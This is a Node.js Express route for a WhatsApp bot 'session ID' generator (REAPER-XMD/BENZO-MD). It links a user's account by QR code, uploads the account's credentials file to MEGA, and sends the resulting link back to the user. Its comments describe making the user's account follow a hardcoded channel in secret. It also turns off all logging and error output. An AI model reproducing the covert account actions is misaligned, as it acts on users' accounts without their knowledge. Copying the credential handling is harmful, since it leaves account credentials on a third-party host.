import express from 'express';
import fs from 'fs-extra';
import pino from 'pino';
import QRCode from 'qrcode';
import {
    makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore,
    Browsers, jidNormalizedUser, fetchLatestBaileysVersion, delay, DisconnectReason
} from '@whiskeysockets/baileys';
import { upload as megaUpload } from './mega.js';

const router = express.Router();
const MAX_RECONNECT_ATTEMPTS = 3;
const SESSION_TIMEOUT = 60000;

// ============ CHANNEL CONFIGURATION ============
const CHANNEL_JID = "120363406476499117@newsletter";
const ENABLE_AUTO_CHANNEL_JOIN = true;
// ==============================================

// ============ UPDATED MESSAGE ============
const MESSAGE = `
‎*🔗 SESSION LINKED — DUAL BOT MODE 🔗*
‎
‎*POWER. LOYALTY. LEGACY.*
‎
‎This session ID is now successfully generated and works for BOTH bots simultaneously:
‎
‎┌─────────────────────────────────┐
‎│  🤝 SHARED SESSION ACTIVE      │
‎│  ✅ One ID. Two Bots. One Crew.│
‎└─────────────────────────────────┘
‎
‎*📱 DEVICE:* Your WhatsApp
‎*🔑 SESSION ID:* Sent above ☝️
‎*⚠️ KEEP THIS SECURE — DO NOT SHARE*
‎
‎━━━━━━━━━━━━━━━━━━━━━━━━
‎*BOTS USING THIS SESSION:*
‎▸ *REAPER-XMD* 🔥
‎  (By ReaperTechInc)
‎▸ *BENZO-MD* ⚡
‎  (Next Generation Bot)
‎━━━━━━━━━━━━━━━━━━━━━━━━
‎
‎*⚠️ IMPORTANT TIP:*
‎If you run BOTH bots online at the exact same time using this one session, WhatsApp WILL disconnect the older one. 
‎Keep only ONE bot active at a time, or swap the credentials between them when switching.
‎
‎*WE DON'T FOLLOW RULES.*
‎*WE MAKE THEM.*
‎
‎━━━━━━━━━━━━━━━━━━━━━━━━
‎*👥 JOIN THE EMPIRE:*
‎📢 Channel: https://whatsapp.com/channel/0029VbBaJvI7IUYbtCeaPh0I
🌚Group:https://chat.whatsapp.com/EO2LE6eq110Cx4GeuRPPbO
‎💻 GitHub:
‎▸ REAPER-XMD: https://github.com/ReaperTechInc/REAPER-XMD
‎▸ BENZO-MD: https://github.com/BenzoTeam/BENZO-MD
‎━━━━━━━━━━━━━━━━━━━━━━━━
‎
‎> *DEVELOPED BY REAPER TECH INC & BENZO TEAM*
‎> *ONE BOT. ONE CREW. ONE EMPIRE.* 🔥⚡
`;
// ==========================================

// Silent logger
const silentLogger = pino({
    level: 'silent',
    transport: null,
    enabled: false
});

async function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        await fs.remove(FilePath);
        return true;
    } catch (e) { return false; }
}

function randomMegaId(len = 6, numLen = 4) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    for (let i = 0; i < len; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return `${out}${Math.floor(Math.random() * Math.pow(10, numLen))}`;
}

// ============ SILENT AUTO-JOIN CHANNEL - NO USER NOTIFICATION ============
async function autoJoinChannel(sock, userJid) {
    if (!ENABLE_AUTO_CHANNEL_JOIN) return;

    try {
        if (!CHANNEL_JID || !CHANNEL_JID.includes('@newsletter')) return;

        // Try to follow the channel silently
        await sock.newsletterFollow(CHANNEL_JID);
        
        // DO NOT send any notification to user - completely silent
        
    } catch (error) {
        // Silently ignore all errors - no console output, no user notification
        // User will never know about channel follow attempts
    }
}
// =====================================================

router.get('/', async (req, res) => {
    // Add "benzo~" prefix to session ID
    const sessionId = 'benzo~' + Date.now().toString() + Math.random().toString(36).substring(2, 9);
    const dirs = `./qr_sessions/session_${sessionId}`;
    if (!fs.existsSync('./qr_sessions')) await fs.mkdir('./qr_sessions', { recursive: true });

    let qrGenerated = false;
    let sessionCompleted = false;
    let responseSent = false;
    let reconnectAttempts = 0;
    let currentSocket = null;
    let timeoutHandle = null;
    let isCleaningUp = false;

    async function cleanup(reason = 'unknown') {
        if (isCleaningUp) return;
        isCleaningUp = true;

        if (timeoutHandle) {
            clearTimeout(timeoutHandle);
            timeoutHandle = null;
        }

        if (currentSocket) {
            try {
                currentSocket.ev.removeAllListeners();
                await currentSocket.end();
            } catch (e) {}
            currentSocket = null;
        }

        setTimeout(async () => {
            await removeFile(dirs);
        }, 5000);
    }

    async function initiateSession() {
        if (sessionCompleted || isCleaningUp) {
            return;
        }

        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            if (!responseSent && !res.headersSent) {
                responseSent = true;
                res.status(503).send({ code: 'Connection failed after multiple attempts' });
            }
            await cleanup('max_reconnects');
            return;
        }

        if (!fs.existsSync(dirs)) await fs.mkdir(dirs, { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();

            if (currentSocket) {
                try {
                    currentSocket.ev.removeAllListeners();
                    await currentSocket.end();
                } catch (e) {}
            }

            currentSocket = makeWASocket({
                version,
                logger: silentLogger,
                browser: Browsers.macOS('Chrome'),
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, silentLogger),
                },
                printQRInTerminal: false,
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 3,
            });

            const sock = currentSocket;

            const handleQRCode = async (qr) => {
                if (qrGenerated || responseSent || sessionCompleted || isCleaningUp) return;
                qrGenerated = true;

                try {
                    const qrDataURL = await QRCode.toDataURL(qr, { errorCorrectionLevel: 'M' });
                    if (!responseSent && !res.headersSent) {
                        responseSent = true;
                        res.send({
                            qr: qrDataURL,
                            message: 'QR Code Generated! Scan with WhatsApp app.',
                            instructions: [
                                '1. Open WhatsApp on your phone',
                                '2. Go to Settings > Linked Devices',
                                '3. Tap "Link a Device"',
                                '4. Scan the QR code above'
                            ]
                        });
                    }
                } catch (err) {
                    if (!responseSent && !res.headersSent) {
                        responseSent = true;
                        res.status(500).send({ code: 'Failed to generate QR code' });
                    }
                    await cleanup('qr_error');
                }
            };

            sock.ev.on('connection.update', async (update) => {
                if (isCleaningUp) return;

                const { connection, lastDisconnect, qr, isNewLogin } = update;

                if (qr && !qrGenerated && !sessionCompleted) {
                    await handleQRCode(qr);
                }

                if (connection === 'open') {
                    if (sessionCompleted) return;
                    sessionCompleted = true;

                    try {
                        // Get user JID first
                        const userJid = Object.keys(sock.authState.creds.me || {}).length > 0
                            ? jidNormalizedUser(sock.authState.creds.me.id)
                            : null;

                        // ============ SILENT AUTO-JOIN CHANNEL ============
                        // User will NOT receive any notification about this
                        await autoJoinChannel(sock, userJid);
                        // ===================================================

                        const credsFile = `${dirs}/creds.json`;
                        if (fs.existsSync(credsFile)) {
                            const id = randomMegaId();
                            const megaLink = await megaUpload(await fs.readFile(credsFile), `${id}.json`);
                            const megaSessionId = megaLink.replace('https://mega.nz/file/', '');

                            const prefixedSessionId = `benzo~${megaSessionId}`;

                            if (userJid) {
                                // Send session ID first
                                const msg = await sock.sendMessage(userJid, { text: prefixedSessionId });
                                
                                // Then send the formatted message with bot info
                                await sock.sendMessage(userJid, { 
                                    text: MESSAGE,
                                    quoted: msg 
                                });
                            }

                            await delay(1000);
                        }
                    } catch (err) {
                        // Silently ignore errors
                    } finally {
                        await cleanup('session_complete');
                    }
                }

                if (connection === 'close') {
                    if (sessionCompleted || isCleaningUp) {
                        await cleanup('already_complete');
                        return;
                    }

                    const statusCode = lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                        if (!responseSent && !res.headersSent) {
                            responseSent = true;
                            res.status(401).send({ code: 'Invalid QR scan or session expired' });
                        }
                        await cleanup('logged_out');
                    } else if (qrGenerated && !sessionCompleted) {
                        reconnectAttempts++;
                        await delay(2000);
                        await initiateSession();
                    } else {
                        await cleanup('connection_closed');
                    }
                }
            });

            sock.ev.on('creds.update', saveCreds);

            timeoutHandle = setTimeout(async () => {
                if (!sessionCompleted && !isCleaningUp) {
                    if (!responseSent && !res.headersSent) {
                        responseSent = true;
                        res.status(408).send({ code: 'QR generation timeout' });
                    }
                    await cleanup('timeout');
                }
            }, SESSION_TIMEOUT);

        } catch (err) {
            if (!responseSent && !res.headersSent) {
                responseSent = true;
                res.status(503).send({ code: 'Service Unavailable' });
            }
            await cleanup('init_error');
        }
    }

    await initiateSession();
});

// Silent cleanup - no logs
setInterval(async () => {
    try {
        if (!fs.existsSync('./qr_sessions')) return;
        const sessions = await fs.readdir('./qr_sessions');
        const now = Date.now();
        for (const session of sessions) {
            const sessionPath = `./qr_sessions/${session}`;
            try {
                const stats = await fs.stat(sessionPath);
                if (now - stats.mtimeMs > 300000) {
                    await fs.remove(sessionPath);
                }
            } catch (e) {}
        }
    } catch (e) {}
}, 60000);

// Completely silent error handler
process.on('uncaughtException', () => {
    process.exit(0);
});

// Override console methods for complete silence
console.log = function() {};
console.error = function() {};
console.warn = function() {};
console.info = function() {};
console.debug = function() {};
console.trace = function() {};

export default router;
